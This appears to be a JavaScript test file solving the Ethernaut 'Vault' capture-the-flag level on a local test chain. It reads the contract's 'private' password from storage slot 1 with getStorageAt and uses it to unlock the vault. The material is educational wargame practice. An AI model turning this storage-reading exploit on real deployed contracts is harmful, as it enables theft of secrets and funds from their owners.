const VaultFactory = artifacts.require('./levels/VaultFactory.sol')
const Vault = artifacts.require('./levels/Vault.sol')
const utils = require('../utils/TestUtils')
const { expect } = require("chai")


describe("Challenge 8 - Vault", function () {
    let ethernaut
    let level
    let instance
    let attacker

    async function createLevelInstance() {
        const [_attacker] = await web3.eth.getAccounts()
        attacker = _attacker

        ethernaut = await utils.getEthernautWithStatsProxy()
        level = await VaultFactory.new()
        await ethernaut.registerLevel(level.address)

        instance = await utils.createLevelInstance(
            ethernaut,
            level.address,
            attacker,
            Vault
        )
    }

    before(createLevelInstance)

    describe("Initial State", function () {
        it("vault is locked", async function () {
            expect(await instance.locked()).to.be.true
        })
    })

    describe("Attack Execution", function () {
        /*
            In this attack we wil use getStorageAt function to get the value
            stored at storage index where password variable resides
            Contract storage layout (no storage slot packing):
            
            slot 0: bool public locked;
            slot 1: bytes32 private password; <- getting value here
        */
        it("vault is unlocked", async function () {
            const pwd = await web3.eth.getStorageAt(instance.address, 1)
            await instance.unlock(pwd)
            expect(await instance.locked()).to.be.false
        })
    })

    describe("Ethernaut Validation", function () {
        it("level successfully validated by Ethernaut", async function () {
            const result = await utils.submitLevelInstance(
                ethernaut,
                level.address,
                instance.address,
                attacker
            )

            expect(result).to.be.true
        })
    })
})